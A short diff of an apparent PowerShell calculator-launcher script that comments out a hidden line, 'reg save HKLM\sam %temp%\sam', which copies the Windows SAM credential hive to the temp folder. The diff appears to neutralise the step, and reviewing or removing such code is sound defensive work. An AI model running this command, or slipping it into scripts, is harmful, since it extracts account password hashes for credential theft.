@@ -3,7 +3,7 @@
 	Launches the calculator application
 #>
 
-reg save HKLM\sam %temp%\sam
+### reg save HKLM\sam %temp%\sam
 
 try {
 	Start-Process ms-calculator:
